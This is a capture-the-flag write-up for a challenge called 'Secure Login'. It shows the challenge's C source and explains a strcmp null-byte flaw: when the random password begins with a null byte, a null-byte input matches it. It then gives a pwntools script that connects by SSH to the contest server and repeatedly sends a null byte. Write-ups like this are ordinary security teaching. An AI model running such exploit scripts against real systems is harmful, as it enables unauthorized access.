# Secure Login

## Description

My login is, potentially, and I don't say this lightly, if you know me you know that's the truth, it's truly, and no this isn't snake oil, this is, no joke, the most secure login service in the world (source).

Try to hack me at /problems/2021/secure_login on the shell server.

## Solution

Let's take a look to the code:

````
#include <stdio.h>

char password[128];

void generate_password() {
	FILE *file = fopen("/dev/urandom","r");
	fgets(password, 128, file);
	fclose(file);
}

void main() {
	puts("Welcome to my ultra secure login service!");

	// no way they can guess my password if it's random!
	generate_password();

	char input[128];
	printf("Enter the password: ");
	fgets(input, 128, stdin);

	if (strcmp(input, password) == 0) {
		char flag[128];

		FILE *file = fopen("flag.txt","r");
		if (!file) {
		    puts("Error: missing flag.txt.");
		    exit(1);
		}

		fgets(flag, 128, file);
		puts(flag);
	} else {
		puts("Wrong!");
	}
}

````

The function fgets, doesn't seem vulnerable... But strcmp starts comparing the first character of each string. If they are equal to each other, it continues with the following pairs until the characters differ or until a terminating null-character is reached. 
So if the two strings starts with the string terminator the function will return 0 because the two strings match up to the null character.

We reach our goal! Let's write the script:
````
from pwn import *

#connection
conn = ssh(host='shell.actf.co', user='team', password='pw')
conn = conn.shell('/bin/bash')
conn.sendline('cd /problems/2021/secure_login')

#waiting for the magic
for x in range(1000):
	conn.sendline('./login')
	conn.recvuntil(': ')
	conn.sendline(b'\x00')
	print(conn.recvline())

conn.interactive()
conn.close()
````


#### **FLAG >>** `FLAG QUI`
